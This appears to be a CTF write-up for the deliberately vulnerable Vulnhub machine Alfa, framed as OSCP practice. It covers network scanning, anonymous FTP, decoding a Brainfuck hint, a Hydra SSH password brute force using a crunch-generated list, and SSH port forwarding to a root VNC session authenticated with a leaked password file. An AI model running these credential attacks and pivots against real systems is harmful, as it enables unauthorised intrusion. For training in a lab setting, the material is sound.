---
title: Write-up Alfa on Vulnhub
author: eMVee
date: 2023-04-10 20:00:00 +0800
categories: [CTF, Vulnhub]
tags: [Vulnhub, OSCP, port forward, local port forwarding]
render_with_liquid: false
---

During your preparation for the OSCP exam, it's essential to gain more hands-on hacking experience and develop your methodology to succeed in the exam. TJnull has compiled a popular list of vulnerable machines to help you practice. One such machine, Alfa, can be downloaded from [Vulnhub](https://www.vulnhub.com/entry/alfa-1,655/). If the machine is no longer available on Vulnhub, you can still download it from the Wayback Machine using this link: [Alfa.ova](https://web.archive.org/web/20230223015504/https://download.vulnhub.com/alfa/Alfa.ova).

Once you've downloaded the virtual machine, you'll need to configure it to be on the same network as your Kali machine for seamless connectivity.

## Getting started

After downloading and configuring the virtual machines it is time to start.
First we have to create a working directory and check my IP address.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/Vulnhub

┌──(emvee㉿kali)-[~/Documents/Vulnhub]
└─$ mcd Alfa      

┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ myip    

    inet 127.0.0.1
    inet 10.0.2.15
```

----

## Enumeration
As soon as everything is ready and we can start we should find the target in the cirtual network. There are several techniques what could be used to identify hosts on a network.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.40
```
Fping showed an IP address what I did not see before on the network. Let's run arp-scan and netdiscover as well.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ sudo arp-scan --localnet  
[sudo] password for emvee: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:e0:29:f9, IPv4: 10.0.2.15
Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:03:39:b1       PCS Systemtechnik GmbH
10.0.2.40       08:00:27:96:76:3b       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.8: 256 hosts scanned in 2.032 seconds (125.98 hosts/sec). 4 responded

```
A confirmation of the IP address by arp-scan. Next tool is netdiscover, just to confirm what we already know.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ sudo netdiscover -r 10.0.2.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts 
 
  4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                                                                          
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                         
 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                         
 10.0.2.3        08:00:27:03:39:b1      1      60  PCS Systemtechnik GmbH                                                                                                                                                                 
 10.0.2.40       08:00:27:96:76:3b      1      60  PCS Systemtechnik GmbH     
```
We have confirmed that the IP address `10.0.2.40` should be our target.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ ip=10.0.2.40 
```
Now let's see if the target would reply on our poing request.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ ping $ip -c 3                                           
PING 10.0.2.40 (10.0.2.40) 56(84) bytes of data.
64 bytes from 10.0.2.40: icmp_seq=1 ttl=64 time=0.457 ms
64 bytes from 10.0.2.40: icmp_seq=2 ttl=64 time=0.396 ms
64 bytes from 10.0.2.40: icmp_seq=3 ttl=64 time=0.397 ms

--- 10.0.2.40 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2033ms
rtt min/avg/max/mdev = 0.396/0.416/0.457/0.028 ms

```
Based on value 64 in the ttl field in the reply we can asume the target is running on a Linux distro. Let's run a basic port scan with nmap.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ nmap -sC -p- $ip -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 22:59 CEST
Nmap scan report for 10.0.2.40
Host is up (0.0019s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0            4096 Dec 17  2020 thomas
80/tcp    open  http
|_http-title: Alfa IT Solutions
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
65111/tcp open  unknown

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: alfa
|   NetBIOS computer name: ALFA\x00
|   Domain name: \x00
|   FQDN: alfa
|_  System time: 2023-04-10T22:59:49+02:00
| smb2-time: 
|   date: 2023-04-10T20:59:49
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: 0s
|_nbstat: NetBIOS name: ALFA, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

Nmap done: 1 IP address (1 host up) scanned in 30.44 seconds

```
The results of nmap are in 30 seconds back. So let's add some information to our notes. 
* Linux, probably debian
* Port 21
	* FTP
* Port 80
	* HTTP
* Port 139, 445
	* SMB
	* Samba 4.9.5-Debian

Based on the results I decide to run an advanced port scan with nmap. The advanced scan shows some more information about versions and it might tell us if there is an anonymous session allowed on the FTP service.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ sudo nmap -sC -sV -T4 -A -p- $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 23:01 CEST
Nmap scan report for 10.0.2.40
Host is up (0.00072s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0            4096 Dec 17  2020 thomas
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Alfa IT Solutions
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
65111/tcp open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 ad3e8d4548b16388634764e562286d02 (RSA)
|   256 1db30cca5f22a417d661b5f72c50e94c (ECDSA)
|_  256 421588481742699bb6e14e3e810b680c (ED25519)
MAC Address: 08:00:27:96:76:3B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: Host: ALFA; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: ALFA, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: alfa
|   NetBIOS computer name: ALFA\x00
|   Domain name: \x00
|   FQDN: alfa
|_  System time: 2023-04-10T23:02:09+02:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-04-10T21:02:09
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.72 ms 10.0.2.40

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.85 seconds

```
So let's add some more information to our notes. My notes look like this for now:
* Linux, probably debian
* Port 21
	* FTP
	* anonymous
	* thomas
* Port 80
	* HTTP
	* Apache/2.4.38 (Debian)
	* Title: Alfa IT Solutions
* Port 139, 445
	* SMB
	* Samba 4.9.5-Debian
	* Computer name alfa
* Port 65111
	* SSH
	* OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

The FTP service can be accessed with an anonymous user. Let's find out what information is available on the FTP server.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ ftp $ip -a                        
Connected to 10.0.2.40.
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||15300|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Dec 17  2020 thomas
226 Directory send OK.
ftp> cd thomas
250 Directory successfully changed.
ftp> dir
229 Entering Extended Passive Mode (|||52136|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0          104068 Dec 17  2020 milo.jpg
226 Directory send OK.
ftp> get milo.jpg
local: milo.jpg remote: milo.jpg
229 Entering Extended Passive Mode (|||19229|)
150 Opening BINARY mode data connection for milo.jpg (104068 bytes).
100% |**********************************************************************************************************************************************************************************************|   101 KiB    2.51 MiB/s    00:00 ETA
226 Transfer complete.
104068 bytes received in 00:00 (2.48 MiB/s)
ftp> exit
221 Goodbye.

```
Within the FTP server a directory called `thomas` can be accessed. In that directory a image is tored with the name `milo.jpg`. Let's download this file and look at this image.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ xdg-open milo.jpg  
```

![Image](/assets/img/WriteUp/Vulnhub/Alfa/Pasted image 20230410231115.png){: width="700" height="400" }


It looks like it is a dog. This dog could have the name `milo`. So let's keep this in mind and add it to our notes.

Now let's enumerate the webservice. First we will start with whatweb to discover the techniques used on the website.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ whatweb http://$ip
http://10.0.2.40 [200 OK] Apache[2.4.38], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.0.2.40], Script, Title[Alfa IT Solutions]
```
Well, the results are allready discovered with nmap. So we have nothing to add to the notes. Now it is time to run nikto against the target.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ nikto -h http://$ip 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.40
+ Target Hostname:    10.0.2.40
+ Target Port:        80
+ Start Time:         2023-04-10 23:12:23 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: f1e, size: 5b6a72cabd62e, mtime: gzip
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2023-04-10 23:12:49 (GMT2) (26 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
Nikto did not find any interesting information what we could use for our attack . Let's navigate with the browser to the website.

![Image](/assets/img/WriteUp/Vulnhub/Alfa/Pasted image 20230410231556.png){: width="700" height="400" }


There are no active hyperlinks on the website, even the source code is not useful for us as attacker. Perhaps there could be find something interesting while enumerating files and directories with dirsearch.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ dirsearch -u http://$ip -e php,txt,html -w /usr/share/wordlists/dirb/big.txt

  _|. _ _  _  _  _ _|_    v0.4.2                            
 (_||| _) (/_(_|| (_| )
 
Extensions: php, txt, html | HTTP method: GET | Threads: 30 | Wordlist size: 20469

Output File: /home/emvee/.dirsearch/reports/10.0.2.40/_23-04-10_23-17-26.txt

Error Log: /home/emvee/.dirsearch/logs/errors-23-04-10_23-17-26.log

Target: http://10.0.2.40/

[23:17:26] Starting: 
[23:17:39] 301 -  304B  - /css  ->  http://10.0.2.40/css/                   
[23:17:46] 301 -  306B  - /fonts  ->  http://10.0.2.40/fonts/               
[23:17:52] 301 -  307B  - /images  ->  http://10.0.2.40/images/             
[23:17:56] 301 -  303B  - /js  ->  http://10.0.2.40/js/                     
[23:18:20] 200 -  459B  - /robots.txt                                       
[23:18:23] 403 -  274B  - /server-status

Task Completed 
```
Dirsearched discovered a robots.txt file. Let's check the content of this file.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ curl http://10.0.2.40/robots.txt
/home
/admin
/login
/images
/cgi-bin
/intranet
/wp-admin
/wp-login


++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>+++++++++++++++++.>>---.+++++++++++.------.-----.<<--.>>++++++++++++++++++.++.-----..-.+++.++.

```
In the bottom of the `robots.txt` file something is shown. I've no idea what this could be. So let's use our Google Fu to identify what this might be.
```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>+++++++++++++++++.>>---.+++++++++++.------.-----.<<--.>>++++++++++++++++++.++.-----..-.+++.++.
```
This looks like it is BRAINFUCK according Google. Well there is a second hit with BRAINFUCK to which could be used to encode and decode. Let's visit the website.

![Image](/assets/img/WriteUp/Vulnhub/Alfa/Pasted image 20230410232145.png){: width="700" height="400" }


Now that looks interesting... A directory what we were not allowed to find.

![Image](/assets/img/WriteUp/Vulnhub/Alfa/Pasted image 20230410232456.png){: width="700" height="400" }


By opening the website (directory) we get some juicy information about how we could generate a password list. The password should exist with the name of the dog, followed by three digits. We can use `crunch` to generate a passwordlist which we can use as input to run a dictionary attack with Hydra.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ crunch 7 7 -t milo%%% -o passwords.txt
Crunch will now generate the following amount of data: 8000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1000 

crunch: 100% completed generating output

┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ head -n 5 passwords.txt                        
milo000
milo001
milo002
milo003
milo004

```
The password list has been generated, so we can move to the next step. Brute force our way in with Hydra.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ hydra -l thomas -P passwords.txt $ip ssh -s 65111 -t 64 -I
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-11 06:45:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 1000 login tries (l:1/p:1000), ~16 tries per task
[DATA] attacking ssh://10.0.2.40:65111/
[STATUS] 368.00 tries/min, 368 tries in 00:01h, 657 to do in 00:02h, 39 active
[STATUS] 314.50 tries/min, 629 tries in 00:02h, 405 to do in 00:02h, 30 active
[65111][ssh] host: 10.0.2.40   login: thomas   password: milo666
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 22 final worker threads did not complete until end.
[ERROR] 22 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-11 06:48:28

```
We discovered valid credentials. The username is `thomas` as we allready thought based on the chat and the directory in the FTP server. The password is `milo666` .


------
## Initial access
Now let's logon to the SSH service on port 65111 which we have discovered with our advanced nmap port scan.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ ssh thomas@$ip -p 65111                                   
thomas@10.0.2.40's password: 
Linux Alfa 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

####################################################################
#                  ,---------------------------,                   #
#                  |  /---------------------\  |                   #
#                  | |                       | |                   #
#                  | |         +----+        | |                   #
#                  | |         |ALFA|        | |                   #
#                  | |         +----+        | |                   #
#                  | |                       | |                   #
#                  |  \_____________________/  |                   #
#                  |___________________________|                   #
#                ,---\_____     []     _______/------,             #
#              /         /______________\           /|             #
#            /___________________________________ /  | ___         #
#            |                                   |   |    )        #
#            |  _ _ _                 [-------]  |   |   (         #
#            |  o o o                 [-------]  |  /    _)_       #
#            |__________________________________ |/     /  /       #
#        /-------------------------------------/|      ( )/        #
#      /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /                   #
#    /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /                     #
#     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                       #
#  ██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗  #
#  ██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝  #
#  ██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗    #
#  ██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝    #
#  ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗  #
#   ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝  #
####################################################################

thomas@Alfa:~$ 

```
We are now in the system. Let's find out who we are on the system and let's see if we can capture a flag.
```bash
thomas@Alfa:~$ whoami
thomas
thomas@Alfa:~$ id
uid=1000(thomas) gid=1000(thomas) grupos=1000(thomas),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
thomas@Alfa:~$ ls
user.txt
thomas@Alfa:~$ cat user.txt 


.-----------------------------------------------------------------------------.
||Es| |F1 |F2 |F3 |F4 |F5 | |F6 |F7 |F8 |F9 |F10|                             |
||__| |___|___|___|___|___| |___|___|___|___|___|                             |
| _____________________________________________     ________    ___________   |
||~  |! |" |§ |$ |% |& |/ |( |) |= |? |` || |<-|   |Del|Help|  |{ |} |/ |* |  |
||`__|1_|2_|3_|4_|5_|6_|7_|8_|9_|0_|ß_|´_|\_|__|   |___|____|  |[ |]_|__|__|  |
||<-  |Q |W |E |R |T |Z |U |I |O |P |Ü |* |   ||               |7 |8 |9 |- |  |
||->__|__|__|__|__|__|__|__|__|__|__|__|+_|_  ||               |__|__|__|__|  |
||Ctr|oC|A |S |D |F |G |H |J |K |L |Ö |Ä |^ |<'|               |4 |5 |6 |+ |  |
||___|_L|__|__|__|__|__|__|__|__|__|__|__|#_|__|       __      |__|__|__|__|  |
||^    |> |Y |X |C |V |B |N |M |; |: |_ |^     |      |A |     |1 |2 |3 |E |  |
||_____|<_|__|__|__|__|__|__|__|,_|._|-_|______|    __||_|__   |__|__|__|n |  |
|   |Alt|A  |                       |A  |Alt|      |<-|| |->|  |0    |. |t |  |
|   |___|___|_______________________|___|___|      |__|V_|__|  |_____|__|e_|  |
|                                                                             |
`-----------------------------------------------------------------------------'


user_flag==>> M4Mh5FX8EGGGSV6CseRuyyskG

```
We have find one file in the home directory of the user. But we did not search for any secret/hidden files.
```bash
thomas@Alfa:~$ ls -la
total 40
drwxr-xr-x 4 thomas thomas 4096 dic 20  2020 .
drwxr-xr-x 3 root   root   4096 dic 16  2020 ..
-rw------- 1 thomas thomas    4 dic 20  2020 .bash_history
-rw-r--r-- 1 thomas thomas  220 dic 16  2020 .bash_logout
-rw-r--r-- 1 thomas thomas 3526 dic 16  2020 .bashrc
drwx------ 3 thomas thomas 4096 dic 16  2020 .gnupg
drwxr-xr-x 3 thomas thomas 4096 dic 16  2020 .local
-rw-r--r-- 1 thomas thomas  807 dic 16  2020 .profile
-rwxrwxrwx 1 root   root     16 dic 17  2020 .remote_secret
-rw-r--r-- 1 thomas thomas 1332 dic 20  2020 user.txt

```
There is a file `.remote_secret` what we should add to our notes. No idea what this is, but the name says something about remote. Lets stick to our enumeration methodology and check what Linux distro and kernel version are used on the target.

```bash
thomas@Alfa:~$ uname -a
Linux Alfa 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux
thomas@Alfa:~$ uname -mrs
Linux 4.19.0-13-amd64 x86_64
thomas@Alfa:~$ cat /proc/version
Linux version 4.19.0-13-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.160-2 (2020-11-28)
thomas@Alfa:~$ cat /etc/issue
IP address: \4{enp0s3}
thomas@Alfa:~$ cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
thomas@Alfa:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster
thomas@Alfa:~$ 

```
We now know that target is running on Debian 10 with the kernel version `Linux 4.19.0-13-amd64 x86_64` So add this to our notes. Now let's check our sudo privileges.
```bash
thomas@Alfa:~$ sudo -l
-bash: sudo: orden no encontrada
```
We cannot use sudo, so let's find out what other users are on the system.
```bash
thomas@Alfa:~$ awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
thomas
```
It looks like there is only one user `thomas` on the target, let's find out what other users have root permissions.
```bash
thomas@Alfa:~$ grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'
root
thomas@Alfa:~$ 

```
Only root has the administrative privileges for the system. Now let's enumerate services and open ports on the target with netstat.
```bash
thomas@Alfa:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:65111           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::445                  :::*                    LISTEN      -                   
tcp6       0      0 :::139                  :::*                    LISTEN      -                   
tcp6       0      0 ::1:5901                :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::65111                :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 10.0.2.255:137          0.0.0.0:*                           -                   
udp        0      0 10.0.2.40:137           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:137             0.0.0.0:*                           -                   
udp        0      0 10.0.2.255:138          0.0.0.0:*                           -                   
udp        0      0 10.0.2.40:138           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:138             0.0.0.0:*                           -                   
thomas@Alfa:~$ 
```

There is an internal service running on port 5901... and it is only running for 127.0.0.1. To make this service available outside the target we should setup local port forwarding.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ ssh -f -N -L 5901:localhost:5901 thomas@$ip -p 65111
thomas@10.0.2.40's password: 

```
The local port forwarding has been setup and now we can check the service.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ nc 127.0.0.1 5901                                                                                 
RFB 003.008

```
There is a response within the netcat session. I've no idea what this banner might be. So we have to use our Google Fu on `RFB 003.008` and find out what it might be.


```
https://www.google.com/search?q=RFB+003.008
```
It looks like it is a protocol for VNC. We might connect with it via our local port forward. 
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ xtightvncviewer 127.0.0.1:5901
Connected to RFB server, using protocol version 3.8
Performing standard VNC authentication
Password: 
Authentication failure

```
Well that did not work with the password `milo666`. There was a remote_secret file present in the home directory of thomas. Let's transfer this file to our working directory.

```bash
thomas@Alfa:~$ pwd
/home/thomas
thomas@Alfa:~$ ls -la
total 40
drwxr-xr-x 4 thomas thomas 4096 dic 20  2020 .
drwxr-xr-x 3 root   root   4096 dic 16  2020 ..
-rw------- 1 thomas thomas  473 abr 11 08:28 .bash_history
-rw-r--r-- 1 thomas thomas  220 dic 16  2020 .bash_logout
-rw-r--r-- 1 thomas thomas 3526 dic 16  2020 .bashrc
drwx------ 3 thomas thomas 4096 dic 16  2020 .gnupg
drwxr-xr-x 3 thomas thomas 4096 dic 16  2020 .local
-rw-r--r-- 1 thomas thomas  807 dic 16  2020 .profile
-rwxrwxrwx 1 root   root     16 dic 17  2020 .remote_secret
-rw-r--r-- 1 thomas thomas 1332 dic 20  2020 user.txt
thomas@Alfa:~$ cat .remote_secret | base64
0CLgAEMEHmPQIuAAQwQeYw==
thomas@Alfa:~$ exit
cerrar sesión
Connection to 10.0.2.40 closed.
```
Since I used based64 to encode the file we need to decode it with base64 on our machine.
```
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ echo '0CLgAEMEHmPQIuAAQwQeYw==' | base64 -d > remote_secret       
```
The file is in our working directory, now we can use this file perhaps as input for a password or a kind of key just like with SSH.

-----
## Privilege escalation
Let's check the help function to see if we can use a password/key file.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ xtightvncviewer 127.0.0.1:5901 -h   
TightVNC Viewer version 1.3.10

Usage: xtightvncviewer [<OPTIONS>] [<HOST>][:<DISPLAY#>]
       xtightvncviewer [<OPTIONS>] [<HOST>][::<PORT#>]
       xtightvncviewer [<OPTIONS>] -listen [<DISPLAY#>]
       xtightvncviewer -help

<OPTIONS> are standard Xt options, or:
        -via <GATEWAY>
        -shared (set by default)
        -noshared
        -viewonly
        -fullscreen
        -noraiseonbeep
        -passwd <PASSWD-FILENAME> (standard VNC authentication)
        -encodings <ENCODING-LIST> (e.g. "tight copyrect")
        -bgr233
        -owncmap
        -truecolour
        -depth <DEPTH>
        -compresslevel <COMPRESS-VALUE> (0..9: 0-fast, 9-best)
        -quality <JPEG-QUALITY-VALUE> (0..9: 0-low, 9-high)
        -nojpeg
        -nocursorshape
        -x11cursor
        -autopass

Option names may be abbreviated, e.g. -bgr instead of -bgr233.
See the manual page for more information.
```
We can use the flag `-passwd` followed by the password file to connect to the VNC server. Let's try it!
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Alfa]
└─$ xtightvncviewer 127.0.0.1:5901 -passwd remote_secret 
Connected to RFB server, using protocol version 3.8
Performing standard VNC authentication
Authentication successful
Desktop name "Alfa:1 (root)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding


```
It looks like we have root access, now capture the root flag!

![Image](/assets/img/WriteUp/Vulnhub/Alfa/Pasted image 20230411090409.png){: width="700" height="400" }

